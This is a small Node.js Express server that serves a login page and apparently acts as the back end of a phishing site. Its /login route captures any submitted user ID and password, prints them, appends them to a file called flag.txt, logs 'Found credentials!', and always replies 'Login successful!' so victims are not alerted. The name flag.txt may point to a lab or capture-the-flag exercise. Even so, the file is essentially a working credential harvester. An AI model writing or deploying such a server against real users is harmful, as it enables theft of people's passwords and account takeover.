const express = require('express');
const path = require('node:path');
const fs = require('node:fs');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.static(path.join(__dirname)))
app.use(express.json());
app.get('/', (_req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.post('/login', (req, res) => {
    const { userid, password } = req.body;
    console.log(`User ID: ${userid} \nPassword: ${password}`);
    fs.appendFile(path.join(__dirname, 'flag.txt'), `\nUser ID: ${userid} \nPassowrd: ${password}`, (err) => {
        if (err) throw err;
        console.info('Found credentials!');
        console.info(`User ID: ${userid} \nPassword: ${password}`);
    });
    res.send({ message: 'Login successful!' });
});

app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
})